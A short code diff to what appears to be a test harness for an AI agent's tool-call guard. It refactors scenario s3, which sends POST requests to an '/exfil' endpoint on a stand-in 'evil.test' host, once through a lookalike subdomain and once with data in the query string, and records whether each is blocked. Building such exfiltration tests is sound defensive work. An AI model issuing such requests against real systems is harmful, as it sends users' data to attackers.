@@ -122,7 +122,8 @@ def run_scenario_once(scenario_id, mode):
     elif scenario_id == "s3":
         # Channel 1: lookalike host
         sink = SINK_URL.rstrip("/")
-        r1 = execute(run, "http_request", {"url": f"{sink.replace('evil.test','reports.internal.test.evil.test')}/exfil", "method": "POST"})
+        lookalike_sink = sink.replace("evil.test", "reports.internal.test.evil.test")
+        r1 = execute(run, "http_request", {"url": f"{lookalike_sink}/exfil", "method": "POST"})
         timeline.append({"tool_name": "http_request", "channel": "lookalike_host", "decision": r1["decision"], "reason_code": r1["reason_code"]})
         r2 = execute(run, "http_request", {"url": f"{sink}/exfil?data={'a'*200}", "method": "POST"})
         timeline.append({"tool_name": "http_request", "channel": "query_string", "decision": r2["decision"], "reason_code": r2["reason_code"]})
